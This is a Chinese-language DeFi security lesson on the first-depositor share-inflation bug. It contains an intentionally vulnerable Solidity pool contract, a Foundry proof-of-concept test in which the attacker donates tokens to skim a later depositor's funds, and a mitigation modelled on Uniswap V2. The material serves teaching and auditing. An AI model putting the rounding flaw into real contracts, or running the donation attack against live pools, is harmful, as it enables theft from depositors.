[first-deposit.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/first-deposit.sol)

# 首次存款错误

**名称：** 首次存款错误

**描述：** 第一个矿池存款人可能会抢先交易，并被盗取部分存款。在这种情况下，我们可以控制变量“_supplied”。 通过存入少量贷款代币来获得矿池代币，我们可以抢先其他储户的交易，并通过大量“捐赠”抬高矿池代币的价格。 因此，攻击者可以提取比他们最初拥有的更多的贷款代币。

出现这个计算问题是因为，在 Solidity 中，如果用户的池代币值小于 1，它实际上会向下舍入到 0。

**解决办法：**

考虑在第一次存款期间铸造最少量的矿池代币并将其发送到零地址，这会增加攻击成本。 Uniswap V2 通过将前 1000 个 LP 代币发送到零地址解决了这个问题。 在这种情况下也可以做同样的事情，即当totalSupply() == 0时，将第一个最小流动性LP代币发送到零地址以实现份额稀释。

**参考：**

https://defihacklabs.substack.com/p/solidity-security-lesson-2-first

https://github.com/sherlock-audit/2023-02-surge-judging/issues/1

https://github.com/transmissions11/solmate/issues/178

**合约样例:**

```jsx
contract MyToken is ERC20, Ownable {
    constructor() ERC20("MyToken", "MTK") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}

contract SimplePool {
    IERC20 public loanToken;
    uint public totalShares;

    mapping(address => uint) public balanceOf;

    constructor(address _loanToken) {
        loanToken = IERC20(_loanToken);
    }

    function deposit(uint amount) external {
        require(amount > 0, "Amount must be greater than zero");

        uint _shares;
        if (totalShares == 0) {
            _shares = amount;
        } else {
            _shares = tokenToShares(
                amount,
                loanToken.balanceOf(address(this)),
                totalShares,
                false
            );
        }

        require(
            loanToken.transferFrom(msg.sender, address(this), amount),
            "TransferFrom failed"
        );
        balanceOf[msg.sender] += _shares;
        totalShares += _shares;
    }

    function tokenToShares(
        uint _tokenAmount,
        uint _supplied,
        uint _sharesTotalSupply,
        bool roundUpCheck
    ) internal pure returns (uint) {
        if (_supplied == 0) return _tokenAmount;
        uint shares = (_tokenAmount * _sharesTotalSupply) / _supplied;
        if (
            roundUpCheck &&
            shares * _supplied < _tokenAmount * _sharesTotalSupply
        ) shares++;
        return shares;
    }

    function withdraw(uint shares) external {
        require(shares > 0, "Shares must be greater than zero");
        require(balanceOf[msg.sender] >= shares, "Insufficient balance");

        uint tokenAmount = (shares * loanToken.balanceOf(address(this))) /
            totalShares;

        balanceOf[msg.sender] -= shares;
        totalShares -= shares;

        require(loanToken.transfer(msg.sender, tokenAmount), "Transfer failed");
    }
}
```

***\*测试方法:\****

forge test --contracts src/test/**first-deposit.sol**-vvvv

```jsx
// 测试首次存款过程的函数
    function testFirstDeposit() public {
        // Alice的地址被设置为虚拟机中的第一个地址
        address alice = vm.addr(1);
        
        // Bob的地址被设置为虚拟机中的第二个地址
        address bob = vm.addr(2);
        
        // 从 MyTokenContract 转账 1 Ether 加 1 wei 到 Alice 的账户
        MyTokenContract.transfer(alice, 1 ether + 1);
        
        // 将 2 以太币从 MyTokenContract 转移到 Bob 的账户
        MyTokenContract.transfer(bob, 2 ether);

        // 在虚拟机中对 Alice 的帐户发起“恶作剧”
        vm.startPrank(alice);
        
        // Alice 批准 SimplePoolContract 花费 1 wei 的代币
        MyTokenContract.approve(address(SimplePoolContract), 1);
        
        // Alice 将 1 wei 存入 SimplePoolContract，收到 1 个矿池代币作为回报
        SimplePoolContract.deposit(1);

        // Alice 将 1 以太币转移到 SimplePoolContract，这会抬高矿池代币的价格
        MyTokenContract.transfer(address(SimplePoolContract), 1 ether);

        // 停止对 Alice 帐户的恶作剧
        vm.stopPrank();
        
        // 对 Bob 的帐户发起恶作剧
        vm.startPrank(bob);
        
        // Bob 批准 SimplePoolContract 花费其代币中的 2 个以太币
        MyTokenContract.approve(address(SimplePoolContract), 2 ether);
        
        // Bob向SimplePoolContract存入2个以太币，但由于价格上涨，他只收到1个矿池代币
        SimplePoolContract.deposit(2 ether);
        
        // 停止对 Bob 帐户的恶作剧
        vm.stopPrank();
        
        // 对 Alice 的帐户发起恶作剧
        vm.startPrank(alice);

        //获取MyTokenContract中SimplePoolContract的余额
        MyTokenContract.balanceOf(address(SimplePoolContract));

        // Alice 提取 1 个矿池代币并获得 1.5 以太币，从而获利
        SimplePoolContract.withdraw(1);
        
        // 判断 Alice 的余额现在应该是 1.5 以太币。 如果不是，则会抛出错误
        assertEq(MyTokenContract.balanceOf(alice), 1.5 ether);
        
        // 在控制台中记录 Alice 的余额
        console.log("Alice balance", MyTokenContract.balanceOf(alice));
    }
```

![img](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbf5edaeb-708c-433d-b87f-9fd9a16b7633%2FUntitled.png?table=block&id=9f907b3b-45de-448e-ae5b-a3c771d9743f&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)